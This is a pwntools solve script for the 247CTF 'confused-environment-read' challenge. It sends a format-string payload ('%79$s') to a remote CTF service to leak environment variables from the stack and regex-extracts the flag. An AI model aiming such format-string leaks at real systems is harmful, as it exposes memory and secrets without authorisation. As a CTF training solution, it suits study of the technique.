#!/usr/bin/env python3

'''
WhatTheFuzz's submission for the 247CTF challenge confused-environment-read.

This script can be used in the following manner:
python3 ./solve.py

Returns:
    The flag to solve the challenge.
'''

import re
from pwn import *

context.log_level = 'info'
context.terminal = ['gnome-terminal', '-e']

MIN = 79
MAX = 80

def conn():
    '''Establish the connection to the process, local or remote.
    '''

    # This address won't work for you, as it's unique per person per session.
    return remote('65e6bb956a939c2a.247ctf.com', 50007)



def main():
    '''Return the flag.
    '''

    # We don't know how far up the stack the environment variables are, so let's binary search it.
    for i in range(MIN, MAX):
        with conn() as io:

            io.sendlineafter(b"What's your name again?", f'%{i}$s')
            try:
                io.recvline()
                # Get the line that says "Welcome back!"
                line = io.recvline()
                if b'247CTF' in line:
                    flag = re.search(rb'247CTF{.*?}', line).group(0)
                    log.info(f'In the future, you can just use the format string: %{i}$s')
                    log.success(f'The flag is: {flag.decode()}')
                    return flag
            except:
                pass



if __name__ == '__main__':
    main()
